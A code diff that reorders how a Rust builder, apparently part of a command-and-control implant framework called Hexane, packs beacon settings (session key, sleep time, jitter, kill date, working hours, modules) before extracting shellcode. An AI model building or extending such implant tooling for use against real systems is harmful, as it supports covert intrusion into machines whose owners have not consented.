@@ -77,13 +77,10 @@ impl Hexane {
     fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
         let mut stream = Stream::new();
 
-        if let Some(modules) = &self.builder_cfg.loaded_modules {
-            for module in modules {
-                stream.pack_string(module);
-            }
-        } else {
-            wrap_message("DBG", "no external module names found. continue.");
-        }
+        stream.pack_uint32(self.peer_id);
+        stream.pack_bytes(&self.session_key);
+        stream.pack_string(&self.main_cfg.hostname);
+        stream.pack_int32(self.main_cfg.retries);
 
         let working_hours = self.main_cfg.working_hours
             .as_ref()
@@ -95,14 +92,19 @@ impl Hexane {
             .map_or(Ok(0), |date| i64::from_str(date))
             .unwrap();
 
-        stream.pack_bytes(&self.session_key);
-        stream.pack_uint32(self.peer_id);
-        stream.pack_string(&self.main_cfg.hostname);
+        stream.pack_int32(working_hours);
+        stream.pack_uint3264(kill_date);
         stream.pack_uint32(self.main_cfg.sleeptime);
         stream.pack_uint32(self.main_cfg.jitter as u32);
 
-        stream.pack_int32(working_hours);
-        stream.pack_uint3264(kill_date);
+        if let Some(modules) = &self.builder_cfg.loaded_modules {
+            for module in modules {
+                stream.pack_string(module);
+            }
+        } else {
+            wrap_message("DBG", "no external module names found. continue.");
+        }
+
 
         if let Some(network) = self.network_cfg.as_mut() {
             let rtype   = &network.r#type;
@@ -219,8 +221,8 @@ impl Hexane {
             return Err(Custom(e.to_string()))
         };
 
-        let mut shellcode = self.compiler_cfg.build_directory.to_owned();
         let output = &self.builder_cfg.output_name;
+        let mut shellcode = self.compiler_cfg.build_directory.to_owned();
 
         shellcode.push_str("/shellcode.bin");
         extract_section(output, &self.config, shellcode.as_str())
